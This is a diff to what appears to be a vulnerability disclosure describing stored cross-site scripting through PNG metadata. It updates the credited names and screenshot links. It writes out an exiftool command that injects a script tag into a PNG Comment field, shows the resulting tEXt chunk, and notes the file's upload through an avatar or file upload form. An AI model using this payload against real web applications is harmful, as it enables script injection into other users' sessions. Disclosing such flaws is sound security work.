@@ -21,16 +21,19 @@ This allows an attacker to upload a PNG file that executes arbitrary JavaScript 
         A PNG image is created and injected with a script payload into the Comment field using exiftool.
     Exiftool Command:
 
-exiftool -Comment='"><script>alert(prompt("XSS BY BRT"))</script>' pngtoxss.png
+exiftool -Comment='"><script>alert(prompt("XSS BY Sencer Kilic & Berat Aksit"))</script>' pngtoxss.png 
 
-<img width="608" height="55" alt="111" src="https://github.com/user-attachments/assets/2a274e15-2572-4253-9977-a68a8ed6c9ad" />
+
+<img width="750" height="54" alt="1" src="https://github.com/user-attachments/assets/c31c94a9-244e-428d-ad2d-d88f0926fa42" />
+
 
 
     This creates a malicious metadata chunk:
 
-tEXtComment"><script>alert(prompt('XSS BY BRT'))</script>
+tEXtComment"><script>alert(prompt("XSS BY Sencer Kilic & Berat Aksit"))</script>
 
-<img width="667" height="321" alt="2222" src="https://github.com/user-attachments/assets/eba07ccd-eed0-424d-8a1f-91cb3dd9ed0e" />
+<img width="796" height="327" alt="2" src="https://github.com/user-attachments/assets/a6e0fc8a-da12-415f-9829-f526b36524f0" />
+
 
 
     The PNG is then uploaded via the avatar or file upload function.
